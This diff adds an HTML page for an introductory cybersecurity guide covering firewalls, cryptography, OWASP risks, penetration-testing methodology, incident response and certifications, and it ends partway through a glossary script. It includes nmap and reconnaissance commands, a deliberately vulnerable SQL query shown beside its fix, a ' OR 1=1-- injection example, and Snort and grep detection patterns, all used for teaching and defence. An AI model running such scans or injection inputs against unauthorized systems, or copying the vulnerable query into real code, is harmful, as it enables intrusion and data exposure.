@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Cybersecurity Research Portal - Network Security, Penetration Testing, Cryptography, Threat Analysis">
+    <title>Cybersecurity Portal - Research Aggregator</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Poppins:wght@600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/main.css">
+</head>
+<body data-portal="cybersecurity">
+    <div class="app-container">
+        <!-- Sidebar Navigation -->
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <div class="sidebar-logo">
+                    <div class="sidebar-logo-icon">🔐</div>
+                    <h1>Security Portal</h1>
+                </div>
+            </div>
+
+            <div class="sidebar-nav">
+                <div class="nav-section">
+                    <div class="nav-section-title">Navigation</div>
+                    <a href="../index.html" class="nav-item">
+                        <span class="nav-item-icon">🏠</span>
+                        <span>Dashboard</span>
+                    </a>
+                    <a href="#feeds" class="nav-item">
+                        <span class="nav-item-icon">📡</span>
+                        <span>Threat Feeds</span>
+                        <span class="nav-item-badge">Live</span>
+                    </a>
+                    <a href="#guide" class="nav-item active">
+                        <span class="nav-item-icon">📖</span>
+                        <span>Security Guide</span>
+                    </a>
+                </div>
+
+                <div class="nav-section">
+                    <div class="nav-section-title">Related Portals</div>
+                    <a href="computer-science.html" class="nav-item">
+                        <span class="nav-item-icon">💾</span>
+                        <span>Computer Science</span>
+                    </a>
+                    <a href="legal.html" class="nav-item">
+                        <span class="nav-item-icon">⚖️</span>
+                        <span>Legal</span>
+                    </a>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Page Header -->
+            <header class="page-header">
+                <div class="page-header-top">
+                    <div>
+                        <h1 class="page-title">Cybersecurity & Information Security</h1>
+                        <p class="page-subtitle">Protecting systems, networks, and data from digital threats</p>
+                    </div>
+                </div>
+
+                <!-- Search -->
+                <div class="search-container">
+                    <span class="search-icon">🔍</span>
+                    <input type="text" class="search-input" placeholder="Search security topics, vulnerabilities, tools...">
+                </div>
+                <div class="search-results"></div>
+            </header>
+
+            <!-- Guide Index -->
+            <aside class="guide-index">
+                <div class="guide-index-header">
+                    <h3 class="guide-index-title">📑 Guide Index</h3>
+                    <button class="guide-index-toggle">−</button>
+                </div>
+                <ul class="guide-index-list"></ul>
+                <div class="guide-progress">
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 0%;"></div>
+                    </div>
+                    <p class="progress-text">Start reading to track progress</p>
+                </div>
+            </aside>
+
+            <!-- RSS Feeds Section -->
+            <section id="feeds" class="guide-section">
+                <div class="guide-section-header">
+                    <div class="guide-section-number">📡</div>
+                    <h2 class="guide-section-title">Live Security Feeds & Threat Intelligence</h2>
+                </div>
+                <div class="guide-content">
+                    <div class="rss-feed-header">
+                        <p>Latest cybersecurity news, vulnerability disclosures, and threat reports</p>
+                        <div class="rss-feed-actions">
+                            <button class="rss-refresh-btn" onclick="app.refreshFeeds()">🔄 Refresh</button>
+                        </div>
+                    </div>
+                    <div class="rss-feed-list">
+                        <div class="loading">
+                            <div class="loading-spinner"></div>
+                            <p class="loading-text">Loading security feeds...</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Zero-to-Hero Guide -->
+            <section id="section-0" class="guide-section">
+                <div class="guide-section-header">
+                    <div class="guide-section-number">1</div>
+                    <h2 class="guide-section-title">Introduction to Cybersecurity</h2>
+                </div>
+                <div class="guide-content">
+                    <p><span class="glossary-term" data-term="cybersecurity">Cybersecurity</span> is the practice of protecting systems, networks, and programs from digital attacks. These attacks typically aim to access, change, or destroy sensitive information, extort money, or disrupt normal operations.</p>
+
+                    <h3>The CIA Triad</h3>
+                    <p>The foundation of information security rests on three principles, known as the <span class="glossary-term" data-term="cia-triad">CIA Triad</span>:</p>
+
+                    <ul>
+                        <li><strong><span class="glossary-term" data-term="confidentiality">Confidentiality</span></strong> - Ensuring information is accessible only to authorized individuals</li>
+                        <li><strong><span class="glossary-term" data-term="integrity">Integrity</span></strong> - Maintaining accuracy and completeness of data throughout its lifecycle</li>
+                        <li><strong><span class="glossary-term" data-term="availability">Availability</span></strong> - Ensuring systems and data are accessible when needed by authorized users</li>
+                    </ul>
+
+                    <div class="info-box note">
+                        <div class="info-box-icon">💡</div>
+                        <div class="info-box-content">
+                            <h4>Security vs. Usability</h4>
+                            <p>Perfect security would mean no access at all. Real-world security balances protection with usability. The goal is appropriate security for the risk level, not maximum security.</p>
+                        </div>
+                    </div>
+
+                    <h3>Types of Threats</h3>
+                    <p>Understanding threats is the first step to defending against them:</p>
+                    <ul>
+                        <li><strong><span class="glossary-term" data-term="malware">Malware</span></strong> - Viruses, worms, trojans, ransomware, spyware</li>
+                        <li><strong><span class="glossary-term" data-term="phishing">Phishing</span></strong> - Social engineering to steal credentials or data</li>
+                        <li><strong><span class="glossary-term" data-term="mitm">Man-in-the-Middle</span></strong> - Intercepting communications</li>
+                        <li><strong><span class="glossary-term" data-term="dos">Denial of Service</span></strong> - Overwhelming systems to make them unavailable</li>
+                        <li><strong><span class="glossary-term" data-term="sql-injection">SQL Injection</span></strong> - Exploiting database queries</li>
+                        <li><strong><span class="glossary-term" data-term="zero-day">Zero-Day Exploits</span></strong> - Attacks on unknown vulnerabilities</li>
+                    </ul>
+
+                    <h3>Career Paths in Cybersecurity</h3>
+                    <p>Cybersecurity offers diverse career paths:</p>
+                    <ul>
+                        <li><strong>Security Analyst</strong> - Monitor and analyze security events</li>
+                        <li><strong>Penetration Tester</strong> - Ethical hacking to find vulnerabilities</li>
+                        <li><strong>Security Engineer</strong> - Design and implement security solutions</li>
+                        <li><strong>Incident Responder</strong> - Handle security breaches</li>
+                        <li><strong>Security Architect</strong> - Design overall security infrastructure</li>
+                        <li><strong>Forensic Analyst</strong> - Investigate cyber crimes</li>
+                    </ul>
+                </div>
+            </section>
+
+            <section id="section-1" class="guide-section">
+                <div class="guide-section-header">
+                    <div class="guide-section-number">2</div>
+                    <h2 class="guide-section-title">Network Security Fundamentals</h2>
+                </div>
+                <div class="guide-content">
+                    <p><span class="glossary-term" data-term="network-security">Network security</span> involves policies and practices to prevent and monitor unauthorized access, misuse, or denial of computer networks and resources.</p>
+
+                    <h3 id="section-1-sub-0">Network Architecture & Security Zones</h3>
+                    <p>Networks are segmented into security zones to contain breaches:</p>
+
+                    <ul>
+                        <li><strong>External/Internet</strong> - Untrusted public network</li>
+                        <li><strong><span class="glossary-term" data-term="dmz">DMZ (Demilitarized Zone)</span></strong> - Buffer zone for public-facing servers</li>
+                        <li><strong>Internal/LAN</strong> - Trusted internal network</li>
+                        <li><strong>Secure Zone</strong> - Highly sensitive systems and data</li>
+                    </ul>
+
+                    <h3 id="section-1-sub-1">Firewalls</h3>
+                    <p>A <span class="glossary-term" data-term="firewall">firewall</span> monitors and controls incoming and outgoing network traffic based on security rules. Types include:</p>
+
+                    <ul>
+                        <li><strong>Packet Filtering</strong> - Examines packet headers (source, destination, port)</li>
+                        <li><strong>Stateful Inspection</strong> - Tracks connection state</li>
+                        <li><strong>Application Layer</strong> - Inspects packet content (deep packet inspection)</li>
+                        <li><strong>Next-Generation (NGFW)</strong> - Combines features with IPS, threat intelligence</li>
+                    </ul>
+
+                    <div class="code-block">
+                        <div class="code-block-header">
+                            <span class="code-block-lang">iptables - Linux Firewall Rules</span>
+                            <button class="code-block-copy">Copy</button>
+                        </div>
+                        <pre><code># Allow established connections
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+# Allow SSH from specific IP
+iptables -A INPUT -p tcp -s 192.168.1.100 --dport 22 -j ACCEPT
+
+# Allow HTTP/HTTPS
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+
+# Drop all other incoming traffic
+iptables -A INPUT -j DROP
+
+# Log dropped packets
+iptables -A INPUT -j LOG --log-prefix "DROPPED: "</code></pre>
+                    </div>
+
+                    <h3 id="section-1-sub-2">VPNs and Encryption</h3>
+                    <p>A <span class="glossary-term" data-term="vpn">VPN (Virtual Private Network)</span> creates encrypted tunnels over public networks. Common protocols:</p>
+
+                    <ul>
+                        <li><strong>OpenVPN</strong> - Open-source, highly configurable, uses SSL/TLS</li>
+                        <li><strong>WireGuard</strong> - Modern, fast, minimal attack surface</li>
+                        <li><strong>IPSec</strong> - Built into many OSs, complex but powerful</li>
+                    </ul>
+
+                    <h3 id="section-1-sub-3">IDS/IPS Systems</h3>
+                    <p><span class="glossary-term" data-term="ids">Intrusion Detection Systems (IDS)</span> monitor for suspicious activity. <span class="glossary-term" data-term="ips">Intrusion Prevention Systems (IPS)</span> can actively block threats.</p>
+
+                    <div class="code-block">
+                        <div class="code-block-header">
+                            <span class="code-block-lang">Snort Rule Example</span>
+                            <button class="code-block-copy">Copy</button>
+                        </div>
+                        <pre><code># Alert on potential SQL injection attempt
+alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (
+    msg:"SQL Injection Attempt";
+    flow:to_server,established;
+    content:"SELECT"; nocase;
+    content:"FROM"; nocase;
+    content:"WHERE"; nocase;
+    sid:1000001;
+    rev:1;
+)</code></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="section-2" class="guide-section">
+                <div class="guide-section-header">
+                    <div class="guide-section-number">3</div>
+                    <h2 class="guide-section-title">Cryptography Essentials</h2>
+                </div>
+                <div class="guide-content">
+                    <p><span class="glossary-term" data-term="cryptography">Cryptography</span> is the practice of securing communications through encoding. It's the mathematical foundation of digital security.</p>
+
+                    <h3 id="section-2-sub-0">Symmetric Encryption</h3>
+                    <p><span class="glossary-term" data-term="symmetric-encryption">Symmetric encryption</span> uses the same key for encryption and decryption. Fast but requires secure key exchange.</p>
+
+                    <ul>
+                        <li><strong><span class="glossary-term" data-term="aes">AES (Advanced Encryption Standard)</span></strong> - Current standard, 128/192/256-bit keys</li>
+                        <li><strong>ChaCha20</strong> - Stream cipher, fast on devices without AES hardware</li>
+                    </ul>
+
+                    <div class="code-block">
+                        <div class="code-block-header">
+                            <span class="code-block-lang">Python - AES Encryption</span>
+                            <button class="code-block-copy">Copy</button>
+                        </div>
+                        <pre><code>from cryptography.fernet import Fernet
+
+# Generate a key (do this once and store securely)
+key = Fernet.generate_key()
+cipher = Fernet(key)
+
+# Encrypt
+message = b"Secret message"
+encrypted = cipher.encrypt(message)
+print(f"Encrypted: {encrypted}")
+
+# Decrypt
+decrypted = cipher.decrypt(encrypted)
+print(f"Decrypted: {decrypted.decode()}")</code></pre>
+                    </div>
+
+                    <h3 id="section-2-sub-1">Asymmetric Encryption</h3>
+                    <p><span class="glossary-term" data-term="asymmetric-encryption">Asymmetric encryption</span> uses a key pair: public key (share freely) and private key (keep secret). Solves key distribution problem.</p>
+
+                    <ul>
+                        <li><strong><span class="glossary-term" data-term="rsa">RSA</span></strong> - Based on integer factorization, widely used</li>
+                        <li><strong><span class="glossary-term" data-term="ecc">ECC (Elliptic Curve)</span></strong> - Shorter keys, same security, used in TLS, Bitcoin</li>
+                    </ul>
+
+                    <h3 id="section-2-sub-2">Hash Functions</h3>
+                    <p>A <span class="glossary-term" data-term="hash-function">hash function</span> produces a fixed-size output (digest) from any input. One-way: cannot reverse to get original input.</p>
+
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Algorithm</th>
+                                    <th>Output Size</th>
+                                    <th>Status</th>
+                                    <th>Use Cases</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>MD5</td>
+                                    <td>128-bit</td>
+                                    <td style="color: var(--accent-red);">Broken</td>
+                                    <td>Checksums only</td>
+                                </tr>
+                                <tr>
+                                    <td>SHA-1</td>
+                                    <td>160-bit</td>
+                                    <td style="color: var(--accent-orange);">Deprecated</td>
+                                    <td>Legacy systems</td>
+                                </tr>
+                                <tr>
+                                    <td>SHA-256</td>
+                                    <td>256-bit</td>
+                                    <td style="color: var(--accent-green);">Secure</td>
+                                    <td>Digital signatures, blockchain</td>
+                                </tr>
+                                <tr>
+                                    <td>SHA-3</td>
+                                    <td>Variable</td>
+                                    <td style="color: var(--accent-green);">Secure</td>
+                                    <td>Alternative to SHA-2</td>
+                                </tr>
+                                <tr>
+                                    <td>bcrypt/scrypt/Argon2</td>
+                                    <td>Variable</td>
+                                    <td style="color: var(--accent-green);">Secure</td>
+                                    <td>Password hashing</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="info-box danger">
+                        <div class="info-box-icon">🚨</div>
+                        <div class="info-box-content">
+                            <h4>Never Roll Your Own Crypto</h4>
+                            <p>Use established libraries and protocols. Cryptography is extremely difficult to implement correctly. One small mistake can make the entire system insecure.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="section-3" class="guide-section">
+                <div class="guide-section-header">
+                    <div class="guide-section-number">4</div>
+                    <h2 class="guide-section-title">Web Application Security</h2>
+                </div>
+                <div class="guide-content">
+                    <p>Web applications are prime targets due to their accessibility. The <span class="glossary-term" data-term="owasp">OWASP Top 10</span> lists the most critical web security risks.</p>
+
+                    <h3 id="section-3-sub-0">OWASP Top 10 (2021)</h3>
+
+                    <h4>1. Broken Access Control</h4>
+                    <p>Users can act outside their intended permissions. Test: Can a regular user access admin pages?</p>
+
+                    <h4>2. Cryptographic Failures</h4>
+                    <p>Sensitive data exposed due to weak cryptography. Use TLS everywhere, hash passwords with bcrypt/Argon2.</p>
+
+                    <h4>3. Injection</h4>
+                    <p><span class="glossary-term" data-term="sql-injection">SQL Injection</span> and other injection attacks occur when untrusted data is sent to an interpreter.</p>
+
+                    <div class="code-block">
+                        <div class="code-block-header">
+                            <span class="code-block-lang">Vulnerable vs. Secure Code</span>
+                            <button class="code-block-copy">Copy</button>
+                        </div>
+                        <pre><code># VULNERABLE - SQL Injection possible
+query = f"SELECT * FROM users WHERE username = '{username}'"
+
+# SECURE - Parameterized query
+cursor.execute(
+    "SELECT * FROM users WHERE username = %s",
+    (username,)
+)</code></pre>
+                    </div>
+
+                    <h4>4. Insecure Design</h4>
+                    <p>Security must be designed in from the start, not bolted on later.</p>
+
+                    <h4>5. Security Misconfiguration</h4>
+                    <p>Default settings, open cloud storage, verbose error messages, missing security headers.</p>
+
+                    <h3 id="section-3-sub-1">XSS (Cross-Site Scripting)</h3>
+                    <p><span class="glossary-term" data-term="xss">XSS</span> occurs when malicious scripts are injected into web pages viewed by other users.</p>
+
+                    <div class="code-block">
+                        <div class="code-block-header">
+                            <span class="code-block-lang">XSS Prevention</span>
+                            <button class="code-block-copy">Copy</button>
+                        </div>
+                        <pre><code>// VULNERABLE
+element.innerHTML = userInput;
+
+// SECURE - Use textContent for user data
+element.textContent = userInput;
+
+// Or escape HTML entities
+function escapeHtml(text) {
+    return text
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+}</code></pre>
+                    </div>
+
+                    <h3 id="section-3-sub-2">CSRF (Cross-Site Request Forgery)</h3>
+                    <p><span class="glossary-term" data-term="csrf">CSRF</span> tricks authenticated users into performing unintended actions. Prevention: use anti-CSRF tokens.</p>
+
+                    <div class="info-box tip">
+                        <div class="info-box-icon">✅</div>
+                        <div class="info-box-content">
+                            <h4>Security Headers</h4>
+                            <p>Always set these HTTP headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security (HSTS), X-XSS-Protection.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="section-4" class="guide-section">
+                <div class="guide-section-header">
+                    <div class="guide-section-number">5</div>
+                    <h2 class="guide-section-title">Penetration Testing Methodology</h2>
+                </div>
+                <div class="guide-content">
+                    <p><span class="glossary-term" data-term="pentest">Penetration testing</span> is authorized simulated hacking to evaluate security. Always have written permission before testing.</p>
+
+                    <h3 id="section-4-sub-0">Penetration Testing Phases</h3>
+
+                    <h4>1. Reconnaissance</h4>
+                    <p>Gather information about the target. Passive (OSINT) and active (scanning) techniques.</p>
+
+                    <div class="code-block">
+                        <div class="code-block-header">
+                            <span class="code-block-lang">Reconnaissance Tools</span>
+                            <button class="code-block-copy">Copy</button>
+                        </div>
+                        <pre><code># DNS enumeration
+dig example.com ANY
+nslookup -type=any example.com
+
+# Subdomain discovery
+subfinder -d example.com
+amass enum -d example.com
+
+# WHOIS information
+whois example.com
+
+# Web technologies
+whatweb example.com
+wappalyzer</code></pre>
+                    </div>
+
+                    <h4>2. Scanning</h4>
+                    <p>Identify open ports, services, and vulnerabilities.</p>
+
+                    <div class="code-block">
+                        <div class="code-block-header">
+                            <span class="code-block-lang">Nmap Scanning</span>
+                            <button class="code-block-copy">Copy</button>
+                        </div>
+                        <pre><code># Quick scan - top 1000 ports
+nmap -T4 target.com
+
+# Full port scan with version detection
+nmap -p- -sV -sC target.com
+
+# OS detection
+nmap -O target.com
+
+# Vulnerability scan
+nmap --script vuln target.com
+
+# Stealth scan (SYN scan)
+nmap -sS target.com</code></pre>
+                    </div>
+
+                    <h4>3. Exploitation</h4>
+                    <p>Attempt to exploit discovered vulnerabilities (with authorization).</p>
+
+                    <h4>4. Post-Exploitation</h4>
+                    <p>Assess impact: what data is accessible? Can privileges be escalated?</p>
+
+                    <h4>5. Reporting</h4>
+                    <p>Document findings, risk levels, and remediation recommendations.</p>
+
+                    <h3 id="section-4-sub-1">Essential Security Tools</h3>
+
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Tool</th>
+                                    <th>Purpose</th>
+                                    <th>Category</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Nmap</td>
+                                    <td>Port scanning and network discovery</td>
+                                    <td>Scanning</td>
+                                </tr>
+                                <tr>
+                                    <td>Burp Suite</td>
+                                    <td>Web application security testing</td>
+                                    <td>Web Security</td>
+                                </tr>
+                                <tr>
+                                    <td>Wireshark</td>
+                                    <td>Network protocol analyzer</td>
+                                    <td>Network Analysis</td>
+                                </tr>
+                                <tr>
+                                    <td>Metasploit</td>
+                                    <td>Exploitation framework</td>
+                                    <td>Exploitation</td>
+                                </tr>
+                                <tr>
+                                    <td>John the Ripper</td>
+                                    <td>Password cracking</td>
+                                    <td>Password Attacks</td>
+                                </tr>
+                                <tr>
+                                    <td>Hashcat</td>
+                                    <td>Advanced password recovery</td>
+                                    <td>Password Attacks</td>
+                                </tr>
+                                <tr>
+                                    <td>SQLMap</td>
+                                    <td>SQL injection automation</td>
+                                    <td>Web Security</td>
+                                </tr>
+                                <tr>
+                                    <td>Ghidra/IDA</td>
+                                    <td>Reverse engineering</td>
+                                    <td>Binary Analysis</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="info-box warning">
+                        <div class="info-box-icon">⚠️</div>
+                        <div class="info-box-content">
+                            <h4>Legal Warning</h4>
+                            <p>Unauthorized access to computer systems is illegal. Always have explicit written authorization before testing. Practice on intentionally vulnerable systems like DVWA, HackTheBox, or TryHackMe.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="section-5" class="guide-section">
+                <div class="guide-section-header">
+                    <div class="guide-section-number">6</div>
+                    <h2 class="guide-section-title">Security Operations & Incident Response</h2>
+                </div>
+                <div class="guide-content">
+                    <p>Security Operations Centers (SOCs) monitor, detect, and respond to security incidents. <span class="glossary-term" data-term="incident-response">Incident response</span> is the systematic approach to handling security breaches.</p>
+
+                    <h3 id="section-5-sub-0">Incident Response Process</h3>
+
+                    <h4>1. Preparation</h4>
+                    <p>Establish procedures, train staff, deploy tools, create communication plans.</p>
+
+                    <h4>2. Detection & Analysis</h4>
+                    <p>Identify incidents through monitoring, alerts, or reports. Determine scope and impact.</p>
+
+                    <h4>3. Containment</h4>
+                    <p>Limit damage by isolating affected systems. Short-term (stop bleeding) and long-term (fix root cause).</p>
+
+                    <h4>4. Eradication</h4>
+                    <p>Remove threat actors and artifacts. Patch vulnerabilities, remove malware, reset credentials.</p>
+
+                    <h4>5. Recovery</h4>
+                    <p>Restore systems to normal operation. Monitor closely for recurrence.</p>
+
+                    <h4>6. Lessons Learned</h4>
+                    <p>Post-incident review. What happened? How to prevent it? Update procedures.</p>
+
+                    <h3 id="section-5-sub-1">SIEM and Log Analysis</h3>
+                    <p><span class="glossary-term" data-term="siem">SIEM (Security Information and Event Management)</span> aggregates and analyzes security data from across the organization.</p>
+
+                    <div class="code-block">
+                        <div class="code-block-header">
+                            <span class="code-block-lang">Log Analysis Examples</span>
+                            <button class="code-block-copy">Copy</button>
+                        </div>
+                        <pre><code># Find failed SSH logins
+grep "Failed password" /var/log/auth.log | tail -20
+
+# Count login attempts per IP
+grep "Failed password" /var/log/auth.log | \
+    grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | \
+    sort | uniq -c | sort -rn | head -10
+
+# Apache access log analysis - find suspicious requests
+cat /var/log/apache2/access.log | \
+    grep -E "(union|select|script|eval)" | head -20</code></pre>
+                    </div>
+
+                    <h3 id="section-5-sub-2">Threat Intelligence</h3>
+                    <p><span class="glossary-term" data-term="threat-intelligence">Threat intelligence</span> is evidence-based knowledge about threats. Sources include:</p>
+
+                    <ul>
+                        <li><strong>OSINT</strong> - Open source intelligence from public sources</li>
+                        <li><strong>MITRE ATT&CK</strong> - Framework of adversary tactics and techniques</li>
+                        <li><strong>ISACs</strong> - Industry sharing groups (Financial, Healthcare, etc.)</li>
+                        <li><strong>Commercial feeds</strong> - Vendor threat intelligence services</li>
+                    </ul>
+                </div>
+            </section>
+
+            <section id="section-6" class="guide-section">
+                <div class="guide-section-header">
+                    <div class="guide-section-number">7</div>
+                    <h2 class="guide-section-title">Compliance & Governance</h2>
+                </div>
+                <div class="guide-content">
+                    <p>Security compliance ensures organizations meet regulatory requirements and industry standards.</p>
+
+                    <h3>Major Frameworks & Regulations</h3>
+
+                    <h4>GDPR (General Data Protection Regulation)</h4>
+                    <p>EU regulation protecting personal data. Applies to any organization processing EU residents' data.</p>
+
+                    <h4>HIPAA (Health Insurance Portability and Accountability Act)</h4>
+                    <p>US regulation protecting health information. Applies to healthcare providers and their partners.</p>
+
+                    <h4>PCI DSS (Payment Card Industry Data Security Standard)</h4>
+                    <p>Requirements for organizations handling credit card data.</p>
+
+                    <h4>SOC 2 (Service Organization Control 2)</h4>
+                    <p>Audit standard for service providers, covering security, availability, processing integrity, confidentiality, and privacy.</p>
+
+                    <h4>NIST Cybersecurity Framework</h4>
+                    <p>Voluntary framework with five functions: Identify, Protect, Detect, Respond, Recover.</p>
+
+                    <h4>ISO 27001</h4>
+                    <p>International standard for information security management systems (ISMS).</p>
+
+                    <div class="info-box note">
+                        <div class="info-box-icon">💡</div>
+                        <div class="info-box-content">
+                            <h4>Compliance vs. Security</h4>
+                            <p>Compliance is a baseline, not a goal. Being compliant doesn't mean being secure. Focus on actual security; compliance should follow naturally.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="section-7" class="guide-section">
+                <div class="guide-section-header">
+                    <div class="guide-section-number">8</div>
+                    <h2 class="guide-section-title">Certifications & Career Development</h2>
+                </div>
+                <div class="guide-content">
+                    <p>Certifications validate security knowledge and are often required for positions.</p>
+
+                    <h3>Entry-Level Certifications</h3>
+                    <ul>
+                        <li><strong>CompTIA Security+</strong> - Foundational security certification</li>
+                        <li><strong>CompTIA CySA+</strong> - Cybersecurity analyst focus</li>
+                        <li><strong>CEH (Certified Ethical Hacker)</strong> - Penetration testing basics</li>
+                    </ul>
+
+                    <h3>Advanced Certifications</h3>
+                    <ul>
+                        <li><strong>CISSP</strong> - Comprehensive security management (5+ years experience)</li>
+                        <li><strong>OSCP</strong> - Hands-on penetration testing (highly respected)</li>
+                        <li><strong>GIAC certifications</strong> - SANS Institute, highly technical</li>
+                    </ul>
+
+                    <h3>Learning Resources</h3>
+
+                    <h4>Practice Platforms</h4>
+                    <ul>
+                        <li><strong>HackTheBox</strong> - Virtual machines to hack</li>
+                        <li><strong>TryHackMe</strong> - Guided learning paths</li>
+                        <li><strong>PentesterLab</strong> - Web security exercises</li>
+                        <li><strong>OverTheWire</strong> - War games for CLI skills</li>
+                    </ul>
+
+                    <h4>CTF (Capture The Flag)</h4>
+                    <p>Competitive hacking challenges. Great for learning and networking. Find events at CTFtime.org.</p>
+
+                    <h4>Stay Updated</h4>
+                    <ul>
+                        <li>Follow security researchers on Twitter/X</li>
+                        <li>Read security blogs (Krebs on Security, Schneier on Security)</li>
+                        <li>Monitor vulnerability databases (NVD, CVE)</li>
+                        <li>Join security communities (Reddit r/netsec, Discord servers)</li>
+                    </ul>
+
+                    <div class="info-box tip">
+                        <div class="info-box-icon">✅</div>
+                        <div class="info-box-content">
+                            <h4>Build a Home Lab</h4>
+                            <p>Set up virtual machines to practice. Run vulnerable applications (DVWA, WebGoat). Configure firewalls, IDS, and SIEM. Nothing beats hands-on experience.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <!-- Content Length Controller -->
+        <div class="content-length-controller">
+            <span class="content-length-label">Content Depth:</span>
+            <input type="range" class="content-length-slider" min="1" max="12" value="12">
+            <span class="content-length-value">12 pages</span>
+        </div>
+
+        <!-- Definition Window -->
+        <div id="definition-window"></div>
+    </div>
+
+    <script src="../js/core.js"></script>
+    <script>
+        // Cybersecurity Glossary Terms
+        const securityGlossary = {
+            'cybersecurity': {
+                term: 'Cybersecurity',
+                category: 'Fundamentals',
+                definition: 'The practice of protecting systems, networks, programs, and data from digital attacks, unauthorized access, and damage. Encompasses technologies, processes, and practices designed to defend against cyber threats.',
+                example: 'Installing antivirus software, using firewalls, encrypting data, and training employees are all cybersecurity measures.',
+                relatedTerms: ['cia-triad', 'network-security', 'infosec']
+            },
+            'cia-triad': {
+                term: 'CIA Triad',
+                category: 'Fundamentals',
+                definition: 'The three core principles of information security: Confidentiality (data is accessible only to authorized parties), Integrity (data is accurate and unaltered), and Availability (data and systems are accessible when needed).',
+                example: 'A bank must keep customer data confidential, ensure transaction amounts cannot be altered, and maintain 24/7 account access.',
+                relatedTerms: ['confidentiality', 'integrity', 'availability']
+            },
+            'confidentiality': {
+                term: 'Confidentiality',
+                category: 'CIA Triad',
+                definition: 'Ensuring that information is accessible only to those authorized to have access. Implemented through encryption, access controls, and authentication.',
+                example: 'Medical records are confidential - only authorized healthcare providers and the patient can access them.',
+                relatedTerms: ['cia-triad', 'encryption', 'access-control']
+            },
+            'integrity': {
+                term: 'Integrity',
+                category: 'CIA Triad',
+                definition: 'Maintaining the accuracy, consistency, and trustworthiness of data over its lifecycle. Data should not be modified in an unauthorized manner.',
+                example: 'Using checksums to verify file integrity after download ensures the file was not corrupted or tampered with.',
+                relatedTerms: ['cia-triad', 'hash-function', 'digital-signature']
+            },
+            'availability': {
+                term: 'Availability',
+                category: 'CIA Triad',
+                definition: 'Ensuring that authorized users have reliable access to information and systems when needed. Threatened by DoS attacks, hardware failures, and natural disasters.',
+                example: 'A 99.99% uptime SLA guarantees the service will be available except for about 52 minutes per year.',
+                relatedTerms: ['cia-triad', 'dos', 'high-availability']
+            },
+            'malware': {
+                term: 'Malware',
+                category: 'Threats',
+                definition: 'Malicious software designed to damage, disrupt, or gain unauthorized access to computer systems. Includes viruses, worms, trojans, ransomware, spyware, and adware.',
+                example: 'Ransomware encrypts victim files and demands payment for the decryption key.',
+                relatedTerms: ['virus', 'ransomware', 'trojan', 'worm']
+            },
+            'phishing': {
+                term: 'Phishing',
+                category: 'Social Engineering',
+                definition: 'A social engineering attack that uses fraudulent communications (usually email) to trick recipients into revealing sensitive information or installing malware. Often impersonates trusted entities.',
+                example: 'An email appearing to be from your bank asks you to click a link and enter your credentials on a fake website.',
+                relatedTerms: ['social-engineering', 'spear-phishing', 'vishing']
+            },
+            'mitm': {
+                term: 'Man-in-the-Middle (MITM)',
+                category: 'Attacks',
+                definition: 'An attack where the attacker secretly intercepts and possibly alters communications between two parties who believe they are communicating directly with each other.',
+                example: 'On an unsecured Wi-Fi network, an attacker intercepts your banking session and captures your credentials.',
+                relatedTerms: ['arp-spoofing', 'ssl-stripping', 'encryption']
+            },
+            'dos': {
+                term: 'Denial of Service (DoS)',
+                category: 'Attacks',
+                definition: 'An attack aimed at making a system or service unavailable to legitimate users by overwhelming it with traffic or requests. DDoS (Distributed DoS) uses multiple sources.',
+                example: 'A botnet of thousands of compromised computers floods a website with requests, making it inaccessible.',
+                relatedTerms: ['ddos', 'botnet', 'availability']
+            },
+            'sql-injection': {
+                term: 'SQL Injection',
+                category: 'Web Attacks',
+                definition: 'An attack that inserts malicious SQL code into application queries through user input. Can expose, modify, or delete database contents and even execute system commands.',
+                example: 'Input: \' OR 1=1-- turns "SELECT * FROM users WHERE name=\'{input}\'" into a query returning all users.',
+                relatedTerms: ['injection', 'owasp', 'parameterized-query']
+            },
+            'zero-day': {
+                term: 'Zero-Day',
+                category: 'Vulnerabilities',
+                definition: 'A software vulnerability unknown to the vendor, meaning zero days have passed since discovery for a patch. Highly valuable because no defense exists yet.',
+                example: 'Stuxnet used multiple zero-day vulnerabilities to target Iranian nuclear facilities.',
+                relatedTerms: ['vulnerability', 'exploit', 'patch']
+            },
+            'network-security': {
+                term: 'Network Security',
+                category: 'Defense',
+                definition: 'Policies, practices, and tools to prevent and monitor unauthorized access, misuse, or denial of computer networks. Includes firewalls, IDS/IPS, VPNs, and network segmentation.',
